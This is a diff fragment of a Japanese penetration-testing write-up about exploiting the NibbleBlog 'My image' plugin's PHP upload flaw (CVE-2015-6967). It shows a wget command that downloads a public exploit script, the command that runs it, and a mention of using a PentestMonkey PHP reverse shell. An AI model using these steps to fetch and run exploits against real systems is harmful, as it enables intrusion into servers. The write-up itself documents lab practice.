@@ -127,7 +127,7 @@ NibbleBlogのプラグイン「My image」には画像ファイル以外にPHP�
 PoCがあるのでダウンロードし実行  
 PHPは[Reverse Shell Generator](https://www.revshells.com/)のPentestMonkeyを使用
 ```sh
-└─$ wget https://raw.githubusercontent.com/dix0nym/CVE-2015-6967/refs/heads/main/exploit.py
+└─$ wget -nv https://raw.githubusercontent.com/dix0nym/CVE-2015-6967/refs/heads/main/exploit.py
 2025-04-26 07:00:51 URL:https://raw.githubusercontent.com/dix0nym/CVE-2015-6967/refs/heads/main/exploit.py [1932/1932] -> "exploit.py" [1]
 
 └─$ python3.13 exploit.py
